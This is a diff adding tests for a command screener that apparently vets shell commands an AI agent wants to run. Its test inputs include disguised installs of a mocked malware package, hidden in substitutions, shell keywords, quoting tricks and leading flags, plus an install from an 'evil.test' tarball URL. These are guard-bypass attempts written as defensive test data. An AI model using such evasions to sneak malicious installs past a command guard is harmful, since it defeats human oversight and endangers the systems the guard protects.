@@ -171,6 +171,149 @@ describe("agentCheckCommand", () => {
     const v = await agentCheckCommand({ ...base, commandLine: "echo ok && npm install evil@1.0.0" });
     expect(v.decision).toBe("deny");
   });
+
+  function cwdWithManifest(deps: Record<string, string>): string {
+    const dir = mkdtempSync(join(tmpdir(), "dg-cwd-"));
+    writeFileSync(join(dir, "package.json"), JSON.stringify({ dependencies: deps }));
+    return dir;
+  }
+
+  it("treats an install substring inside a quoted curl arg as data — never screens the cwd manifest", async () => {
+    const dir = cwdWithManifest({ "evil-pkg": "1.0.0" });
+    analyzeMock.mockResolvedValue({ packages: [pkg("evil-pkg", "1.0.0", "block", ["confirmed malware"])] });
+    const v = await agentCheckCommand({
+      ...base,
+      cwd: dir,
+      commandLine: `curl -s -A "analysis; npm install; done" "https://registry.npmjs.org/-/v1/search?text=evil-pkg"`,
+    });
+    expect(v.decision).toBe("allow");
+    expect(analyzeMock).not.toHaveBeenCalled();
+  });
+
+  it("treats `&& npm i <pkg>` inside a quoted header as data, not a command", async () => {
+    const dir = cwdWithManifest({ "evil-pkg": "1.0.0" });
+    analyzeMock.mockResolvedValue({ packages: [pkg("evil-pkg", "1.0.0", "block", ["confirmed malware"])] });
+    const v = await agentCheckCommand({
+      ...base,
+      cwd: dir,
+      commandLine: `curl -H "x-note: run && npm i evil-pkg" https://example.com`,
+    });
+    expect(v.decision).toBe("allow");
+    expect(analyzeMock).not.toHaveBeenCalled();
+  });
+
+  it("STILL screens the cwd manifest for a real bare `npm install` (feature intact)", async () => {
+    const dir = cwdWithManifest({ "evil-pkg": "1.0.0" });
+    resolveLatestMock.mockResolvedValue("1.0.0");
+    analyzeMock.mockResolvedValue({ packages: [pkg("evil-pkg", "1.0.0", "block", ["confirmed malware"])] });
+    const v = await agentCheckCommand({ ...base, cwd: dir, commandLine: "npm install" });
+    expect(v.decision).toBe("deny");
+    expect(v.reason).toContain("evil-pkg");
+  });
+
+  it("STILL catches a real install hidden in a $(…) substitution inside double quotes", async () => {
+    analyzeMock.mockResolvedValue({ packages: [pkg("evil-pkg", "9.9.9", "block", ["confirmed malware"])] });
+    const v = await agentCheckCommand({ ...base, commandLine: `echo "$(npm install evil-pkg@9.9.9)"` });
+    expect(v.decision).toBe("deny");
+    expect(v.reason).toContain("evil-pkg@9.9.9");
+  });
+
+  it("does not block `npm run <script>` that takes a URL argument (no phantom package)", async () => {
+    const v = await agentCheckCommand({ ...base, commandLine: "npm run deploy https://example.com/webhook" });
+    expect(v.decision).toBe("allow");
+    expect(analyzeMock).not.toHaveBeenCalled();
+    expect(resolveLatestMock).not.toHaveBeenCalled();
+  });
+
+  it("does not block `yarn <script>` that takes a URL argument", async () => {
+    const v = await agentCheckCommand({ ...base, commandLine: "yarn deploy https://example.com/hook" });
+    expect(v.decision).toBe("allow");
+    expect(analyzeMock).not.toHaveBeenCalled();
+  });
+
+  it("STILL engages on a real install-by-tarball-URL (verb is protected, URL flagged unverifiable)", async () => {
+    const v = await agentCheckCommand({ ...base, commandLine: "npm install https://evil.test/p.tgz" });
+    expect(v.decision).toBe("ask");
+    expect(v.reason).toMatch(/non-registry source/);
+  });
+
+  it("ANSI-C $'…' quoting does not swallow a real top-level `;` install (no bypass)", async () => {
+    analyzeMock.mockResolvedValue({ packages: [pkg("evil-pkg", "1.0.0", "block", ["confirmed malware"])] });
+    const v = await agentCheckCommand({ ...base, commandLine: "echo $'it\\'s fine' ; npm install evil-pkg@1.0.0" });
+    expect(v.decision).toBe("deny");
+    expect(v.reason).toContain("evil-pkg@1.0.0");
+  });
+
+  it("treats a trailing `# … npm install …` comment as data, not a command", async () => {
+    const v = await agentCheckCommand({ ...base, commandLine: "echo building # then npm install evil-pkg@9.9.9" });
+    expect(v.decision).toBe("allow");
+    expect(analyzeMock).not.toHaveBeenCalled();
+  });
+
+  it("still screens the real install that precedes a trailing comment", async () => {
+    analyzeMock.mockResolvedValue({ packages: [pkg("lodash", "1.0.0", "pass")] });
+    await agentCheckCommand({ ...base, commandLine: "npm install lodash@1.0.0 # pin for now" });
+    expect(scannedNames()).toEqual(["lodash"]);
+  });
+
+  it("screens an install hidden in a process substitution <(…)", async () => {
+    analyzeMock.mockResolvedValue({ packages: [pkg("evil-pkg", "9.9.9", "block", ["confirmed malware"])] });
+    const v = await agentCheckCommand({ ...base, commandLine: "cat <(npm install evil-pkg@9.9.9)" });
+    expect(v.decision).toBe("deny");
+    expect(v.reason).toContain("evil-pkg@9.9.9");
+  });
+
+  for (const cmd of [
+    "if ! command -v jq; then npm install evil-pkg@9.9.9; fi",
+    "for p in a b; do npm install evil-pkg@9.9.9; done",
+    "while read p; do npm install evil-pkg@9.9.9; done < list",
+    "case $x in a) npm install evil-pkg@9.9.9;; esac",
+    "! npm install evil-pkg@9.9.9",
+    "true && npm install evil-pkg@9.9.9 || echo failed",
+  ]) {
+    it(`screens an install masked behind a shell keyword: ${cmd}`, async () => {
+      analyzeMock.mockResolvedValue({ packages: [pkg("evil-pkg", "9.9.9", "block", ["confirmed malware"])] });
+      const v = await agentCheckCommand({ ...base, commandLine: cmd });
+      expect(v.decision).toBe("deny");
+      expect(v.reason).toContain("evil-pkg@9.9.9");
+    });
+  }
+
+  for (const cmd of [
+    "npm --prefix /tmp install evil-pkg@9.9.9",
+    "npm --loglevel silent install evil-pkg@9.9.9",
+    "npm --cache /tmp/c install evil-pkg@9.9.9",
+    "npm --userconfig /tmp/rc install evil-pkg@9.9.9",
+    "pip --cache-dir /tmp/c install evil-pkg==9.9.9",
+    "pip --log /tmp/l install evil-pkg==9.9.9",
+  ]) {
+    it(`finds the install verb past a leading value-flag: ${cmd}`, async () => {
+      analyzeMock.mockResolvedValue({ packages: [pkg("evil-pkg", "9.9.9", "block", ["confirmed malware"])] });
+      const v = await agentCheckCommand({ ...base, commandLine: cmd });
+      expect(v.decision).toBe("deny");
+      expect(v.reason).toContain("evil-pkg");
+    });
+  }
+
+  it("does not mis-screen `npm run install` (a script literally named install)", async () => {
+    const v = await agentCheckCommand({ ...base, commandLine: "npm run install" });
+    expect(v.decision).toBe("allow");
+    expect(analyzeMock).not.toHaveBeenCalled();
+    expect(resolveLatestMock).not.toHaveBeenCalled();
+  });
+
+  for (const cmd of ["cargo build", "cargo test", "cargo run", "cargo check", "cargo build --release"]) {
+    it(`allows local cargo compile without asking: ${cmd}`, async () => {
+      const v = await agentCheckCommand({ ...base, commandLine: cmd });
+      expect(v.decision).toBe("allow");
+      expect(analyzeMock).not.toHaveBeenCalled();
+    });
+  }
+
+  it("still defers `cargo install` / `cargo add` (crates not analyzable yet)", async () => {
+    expect((await agentCheckCommand({ ...base, commandLine: "cargo install ripgrep" })).decision).toBe("ask");
+    expect((await agentCheckCommand({ ...base, commandLine: "cargo add serde" })).decision).toBe("ask");
+  });
 });
 
 describe("agentCheckCommand bypass hardening", () => {
